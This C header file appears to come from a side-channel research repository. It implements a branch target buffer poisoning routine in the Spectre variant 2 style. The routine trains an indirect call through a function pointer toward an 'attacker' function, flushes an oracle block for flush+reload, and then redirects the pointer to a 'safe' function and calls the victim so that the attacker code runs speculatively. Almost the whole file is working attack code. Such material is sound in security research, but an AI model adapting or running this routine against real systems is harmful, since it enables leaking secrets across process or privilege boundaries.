#ifndef _BTB_
#define _BTB_

#include "../defines.h"
#include "../sidechannel/flush_reload.h"

extern char* oracle_block;
extern int junk;
extern int (*fp1)(char *info);
extern int (**fp2)(char *info);

int attacker(char *info);
int safe();
int victim(char *info, int input);
static inline void btb_atk(char *info){
    static char trash = '#';
    static int i;
    _mm_mfence();
    fp1 = &attacker;
    fp2 = &fp1;

    _mm_mfence();
    for (i = 0; i < 50; i++){
        junk ^= victim(&trash,0);
    }

    _mm_mfence();

    flush(oracle_block, PAGESIZE);
    _mm_mfence();

    fp1 = &safe;
    fp2 = &fp1;
    _mm_mfence();

    _mm_clflush((void*)fp1);
    _mm_clflush((void*)fp2);
    _mm_mfence();
    junk ^= victim(info,0);
};



#endif